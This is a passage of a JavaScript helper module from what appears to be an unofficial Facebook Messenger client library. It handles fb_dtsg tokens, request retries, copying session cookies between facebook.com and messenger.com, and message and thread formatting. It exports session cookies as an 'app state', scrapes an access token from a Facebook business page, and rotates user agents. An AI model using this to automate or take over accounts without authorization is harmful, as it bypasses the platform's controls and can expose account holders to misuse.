function arrToForm(form) {
  return arrayToObject(
    form,
    function(v) {
      return v.name;
    },
    function(v) {
      return v.val;
    }
  );
}

function arrayToObject(arr, getKey, getValue) {
  return arr.reduce(function(acc, val) {
    acc[getKey(val)] = getValue(val);
    return acc;
  }, {});
}

function getSignatureID() {
  return Math.floor(Math.random() * 2147483648).toString(16);
}

function generateTimestampRelative() {
  const d = new Date();
  return d.getHours() + ":" + padZeros(d.getMinutes());
}

function makeDefaults(html, userID, ctx) {
  let reqCounter = 1;
  const fb_dtsg = getFrom(html, 'name="fb_dtsg" value="', '"');

  let ttstamp = "2";
  for (let i = 0; i < fb_dtsg.length; i++) {
    ttstamp += fb_dtsg.charCodeAt(i);
  }
  const revision = getFrom(html, 'revision":', ",");

  function mergeWithDefaults(obj) {
    const newObj = {
      av: userID,
      __user: userID,
      __req: (reqCounter++).toString(36),
      __rev: revision,
      __a: 1,
      fb_dtsg: ctx.fb_dtsg || fb_dtsg,
      jazoest: ctx.ttstamp || ttstamp
    }

    if (!obj) return newObj;

    for (var prop in obj) {
      if (obj.hasOwnProperty(prop)) {
        if (!newObj[prop])
          newObj[prop] = obj[prop];
      }
    }

    return newObj;
  }

  return {
    get: (url, jar, qs, ctxx, customHeader = {}) => get(url, jar, mergeWithDefaults(qs), ctx.globalOptions, ctxx || ctx, customHeader),
    post: (url, jar, form, ctxx, customHeader = {}) => post(url, jar, mergeWithDefaults(form), ctx.globalOptions, ctxx || ctx, customHeader),
    postFormData: (url, jar, form, qs, ctxx) => postFormData(url, jar, mergeWithDefaults(form), mergeWithDefaults(qs), ctx.globalOptions, ctxx || ctx)
  };
}

function parseAndCheckLogin(ctx, http, retryCount) {
  var delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
  var _try = (tryData) => new Promise(function(resolve, reject) {
    try {
      resolve(tryData());
    } catch (error) {
      reject(error);
    }
  });
  if (retryCount == undefined) retryCount = 0;

  return function(data) {
    function any() {
      if (data.statusCode >= 500 && data.statusCode < 600) {
        if (retryCount >= 5) {
          const err = new Error("Request retry failed. Check the `res` and `statusCode` property on this error.");
          err.statusCode = data.statusCode;
          err.res = data.body;
          err.error = "Request retry failed. Check the `res` and `statusCode` property on this error.";
          throw err;
        }
        retryCount++;
        const retryTime = Math.floor(Math.random() * 5000);
        console.warn("parseAndCheckLogin", "Got status code " + data.statusCode + " - " + retryCount + ". attempt to retry in " + retryTime + " milliseconds...");
        const url = data.request.uri.protocol + "//" + data.request.uri.hostname + data.request.uri.pathname;
        if (data.request.headers["content-type"].split(";")[0] === "multipart/form-data") {
          return delay(retryTime)
            .then(function() {
              return http
                .postFormData(url, ctx.jar, data.request.formData);
            })
            .then(parseAndCheckLogin(ctx, http, retryCount));
        }
        else {
          return delay(retryTime)
            .then(function() {
              return http
                .post(url, ctx.jar, data.request.formData);
            })
            .then(parseAndCheckLogin(ctx, http, retryCount));
        }
      }

      if (data.statusCode === 404) return;

      if (data.statusCode !== 200)
        throw new Error("parseAndCheckLogin got status code: " + data.statusCode + ". Bailing out of trying to parse response.");

      let res = null;
      try {
        res = JSON.parse(makeParsable(data.body));
      } catch (e) {
        const err = new Error("JSON.parse error. Check the `detail` property on this error.");
        err.error = "JSON.parse error. Check the `detail` property on this error.";
        err.detail = e;
        err.res = data.body;
        throw err;
      }

      // In some cases the response contains only a redirect URL which should be followed
      if (res.redirect && data.request.method === "GET") {
        return http
          .get(res.redirect, ctx.jar)
          .then(parseAndCheckLogin(ctx, http));
      }

      // TODO: handle multiple cookies?
      if (res.jsmods && res.jsmods.require && Array.isArray(res.jsmods.require[0]) && res.jsmods.require[0][0] === "Cookie") {
        res.jsmods.require[0][3][0] = res.jsmods.require[0][3][0].replace("_js_", "");
        const requireCookie = res.jsmods.require[0][3];
        ctx.jar.setCookie(formatCookie(requireCookie, "facebook"), "https://www.facebook.com");
        ctx.jar.setCookie(formatCookie(requireCookie, "messenger"), "https://www.messenger.com");
      }

      // On every request we check if we got a DTSG and we mutate the context so that we use the latest
      // one for the next requests.
      if (res.jsmods && Array.isArray(res.jsmods.require)) {
        const arr = res.jsmods.require;
        for (const i in arr) {
          if (arr[i][0] === "DTSG" && arr[i][1] === "setToken") {
            ctx.fb_dtsg = arr[i][3][0];

            // Update ttstamp since that depends on fb_dtsg
            ctx.ttstamp = "2";
            for (let j = 0; j < ctx.fb_dtsg.length; j++) {
              ctx.ttstamp += ctx.fb_dtsg.charCodeAt(j);
            }
          }
        }
      }

      if (res.error === 1357001) {
        const err = new Error('Facebook blocked the login');
        err.error = "Not logged in.";
        throw err;
      }
      return res;
    }
    return _try(any);
  };
}

function saveCookies(jar) {
  return function(res) {
    const cookies = res.headers["set-cookie"] || [];
    cookies.forEach(function(c) {
      if (c.indexOf(".facebook.com") > -1) {
        jar.setCookie(c, "https://www.facebook.com");
      }
      const c2 = c.replace(/domain=\.facebook\.com/, "domain=.messenger.com");
      jar.setCookie(c2, "https://www.messenger.com");
    });
    return res;
  };
}

const NUM_TO_MONTH = [
  "Jan",
  "Feb",
  "Mar",
  "Apr",
  "May",
  "Jun",
  "Jul",
  "Aug",
  "Sep",
  "Oct",
  "Nov",
  "Dec"
];
const NUM_TO_DAY = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"];

function formatDate(date) {
  let d = date.getUTCDate();
  d = d >= 10 ? d : "0" + d;
  let h = date.getUTCHours();
  h = h >= 10 ? h : "0" + h;
  let m = date.getUTCMinutes();
  m = m >= 10 ? m : "0" + m;
  let s = date.getUTCSeconds();
  s = s >= 10 ? s : "0" + s;
  return (
    NUM_TO_DAY[date.getUTCDay()] +
    ", " +
    d +
    " " +
    NUM_TO_MONTH[date.getUTCMonth()] +
    " " +
    date.getUTCFullYear() +
    " " +
    h +
    ":" +
    m +
    ":" +
    s +
    " GMT"
  );
}

function formatCookie(arr, url) {
  return (
    arr[0] + "=" + arr[1] + "; Path=" + arr[3] + "; Domain=" + url + ".com"
  );
}

function formatThread(data) {
  return {
    threadID: formatID(data.thread_fbid.toString()),
    participants: data.participants.map(formatID),
    participantIDs: data.participants.map(formatID),
    name: data.name,
    nicknames: data.custom_nickname,
    snippet: data.snippet,
    snippetAttachments: data.snippet_attachments,
    snippetSender: formatID((data.snippet_sender || "").toString()),
    unreadCount: data.unread_count,
    messageCount: data.message_count,
    imageSrc: data.image_src,
    timestamp: data.timestamp,
    serverTimestamp: data.server_timestamp, // what is this?
    muteUntil: data.mute_until,
    isCanonicalUser: data.is_canonical_user,
    isCanonical: data.is_canonical,
    isSubscribed: data.is_subscribed,
    folder: data.folder,
    isArchived: data.is_archived,
    recipientsLoadable: data.recipients_loadable,
    hasEmailParticipant: data.has_email_participant,
    readOnly: data.read_only,
    canReply: data.can_reply,
    cannotReplyReason: data.cannot_reply_reason,
    lastMessageTimestamp: data.last_message_timestamp,
    lastReadTimestamp: data.last_read_timestamp,
    lastMessageType: data.last_message_type,
    emoji: data.custom_like_icon,
    color: data.custom_color,
    adminIDs: data.admin_ids,
    threadType: data.thread_type
  };
}

function getType(obj) {
  return Object.prototype.toString.call(obj).slice(8, -1);
}

function formatProxyPresence(presence, userID) {
  if (presence.lat === undefined || presence.p === undefined) return null;
  return {
    type: "presence",
    timestamp: presence.lat * 1000,
    userID: userID,
    statuses: presence.p
  };
}

function formatPresence(presence, userID) {
  return {
    type: "presence",
    timestamp: presence.la * 1000,
    userID: userID,
    statuses: presence.a
  };
}

function decodeClientPayload(payload) {
  /*
  Special function which Client using to "encode" clients JSON payload
  */
  return JSON.parse(String.fromCharCode.apply(null, payload));
}

function getAppState(jar) {
  return jar
    .getCookies("https://www.facebook.com")
    .concat(jar.getCookies("https://www.messenger.com"));
}

function getAccessFromBusiness(jar, Options) {
  return function(res) {
    var html = res ? res.body : null;
    return get('https://business.facebook.com/content_management', jar, null, Options, null, { noRef: true })
      .then(function(res) {
        var token = /"accessToken":"([^.]+)","clientID":/g.exec(res.body)[1];
        return [html, token];
      })
      .catch(function() {
        return [html, null];
      });
  }
}

const meta = prop => new RegExp(`<meta property="${prop}" content="([^"]*)"`);
module.exports = {
  //logs
  log(...args) {
    console.log(ws, chalk.green.bold("[LOG]"), ...args);
  },
  error(...args) {
    console.error(ws, chalk.red.bold("[ERROR]"), ...args);
  },
  warn(...args) {
    console.warn(ws, chalk.yellow.bold("[WARNING]"), ...args);
  },
  //end logs
  isReadableStream,
  cleanGet,
  get,
  post,
  postFormData,
  generateThreadingID,
  generateOfflineThreadingID,
  getGUID,
  getFrom,
  makeParsable,
  arrToForm,
  getSignatureID,
  getJar: request.jar,
  generateTimestampRelative,
  makeDefaults,
  parseAndCheckLogin,
  saveCookies,
  getType,
  _formatAttachment,
  formatHistoryMessage,
  formatID,
  formatMessage,
  formatDeltaEvent,
  formatDeltaMessage,
  formatProxyPresence,
  formatPresence,
  formatTyp,
  formatDeltaReadReceipt,
  formatCookie,
  formatThread,
  formatReadReceipt,
  formatRead,
  generatePresence,
  generateAccessiblityCookie,
  formatDate,
  decodeClientPayload,
  getAppState,
  getAdminTextMessageType,
  setProxy,
  getAccessFromBusiness,
  presenceDecode,
  presenceEncode,
  headers,
  defaultUserAgent,
  windowsUserAgent,
  randomUserAgent,
  meta
};
